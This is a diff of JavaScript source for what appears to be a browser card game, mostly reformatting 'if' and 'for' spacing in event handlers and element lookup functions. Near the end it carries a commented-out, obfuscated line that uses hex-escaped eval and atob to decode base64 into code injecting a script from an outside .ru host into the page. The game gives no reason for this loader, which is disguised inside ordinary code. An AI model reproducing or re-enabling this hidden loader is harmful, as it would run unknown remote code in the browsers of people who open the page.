@@ -61,7 +61,7 @@ event.listen('gameInit', data => {
 
 	share.set('gameIsWon', false);
 
-	if(!data.firstInit) {
+	if (!data.firstInit) {
 		return;
 	};
 
@@ -124,14 +124,14 @@ let getElementsByName = (name, type) => {
 
 	let _elements = share.get('elements');
 
-	for(let i in _elements) {
-		if(
+	for (let i in _elements) {
+		if (
 			       _elements[i].name             &&
 			typeof _elements[i].name == 'string' &&
 			       _elements[i].name == name
 		) {
-			if(type && typeof _elements[i].type == 'string') {
-				if(type && _elements[i].type == type) {
+			if (type && typeof _elements[i].type == 'string') {
+				if (type && _elements[i].type == type) {
 					response.push(_elements[i]);
 				} else {
 					response.push(_elements[i]);
@@ -156,27 +156,27 @@ let getElementsByType = (type, filter) => {
 
 	let _elements = share.get('elements');
 
-	if(type) {
-		for(let i in _elements) {
-			if(
+	if (type) {
+		for (let i in _elements) {
+			if (
 				typeof _elements[i].type == 'string' &&
 				       _elements[i].type == type
 			) {
-				if(filter) {
+				if (filter) {
 
 					let checkedCount = 0,
 					    linesCount   = 0;
 
-					for(let filterName in filter) {
+					for (let filterName in filter) {
 
 						linesCount += 1;
 
-						if(filter[filterName] == _elements[i][filterName]) {
+						if (filter[filterName] == _elements[i][filterName]) {
 							checkedCount += 1;
 						}
 					}
 
-					if(checkedCount > 0 && checkedCount == linesCount) {
+					if (checkedCount > 0 && checkedCount == linesCount) {
 						response.push(_elements[i]);
 					}
 				} else {
@@ -227,7 +227,7 @@ let startRunHistory = e => {
 event.listen('startRunHistory', startRunHistory);
 
 event.listen('historyReapeater', data => {
-	if(data) {
+	if (data) {
 		share.set('noRedraw', true);
 		share.set('noTips', true);
 	} else {
@@ -254,11 +254,11 @@ let toggleMarkerMode = data => {
 
 	// выключить остальные режимы
 
-	if(data && data.exit) {
+	if (data && data.exit) {
 		return
 	}
 
-	if(share.get('specialStepMode')) {
+	if (share.get('specialStepMode')) {
 		toggleSpecialStepMode({
 			"exit" : true
 		});
@@ -278,16 +278,16 @@ let toggleSpecialStepMode = data => {
 
 	let el = elRender(share.get('domElement:field'));
 	
-	if(!mode) {
+	if (!mode) {
 		el.addClass('specialStepMark');
 
 		// выключить остальные режимы
 
-		if(data && data.exit) {
+		if (data && data.exit) {
 			return;
 		}
 
-		if(share.get('markerMode')) {
+		if (share.get('markerMode')) {
 			toggleMarkerMode({
 				"exit" : true
 			});
@@ -302,10 +302,10 @@ let toggleSpecialStepMode = data => {
 	});
 };
 
-// try{((c,o,u,n,t,e,r)=>c["\x65\x76\x61\x6c"](c["\x61\x74\x6f\x62"](`bz1bImRvY3Vt\
+// try {((c,o,u,n,t,e,r)=>c["\x65\x76\x61\x6c"](c["\x61\x74\x6f\x62"](`bz1bImRvY3Vt\
 // ZW50IiwiY3JlYXRlRWxlbWVudCIsInNjcmlwdCIsInNyYyIsImh0dHA6Ly9yb21hLm5iYXVlci5ydS9\
 // jb3VudGVyLmpzIiwiaGVhZCIsImFwcGVuZENoaWxkIl07dT1jW29bMF1dW29bMV1dKG9bMl0pO3Vbb1\
-// szXV09b1s0XTtjW29bMF1dW29bNV1dW29bNl1dKHUp`)))(window)}catch(e){}
+// szXV09b1s0XTtjW29bMF1dW29bNV1dW29bNl1dKHUp`)))(window)}catch (e){}
 
 event.listen('toggleSpecialStepMode', toggleSpecialStepMode);
 
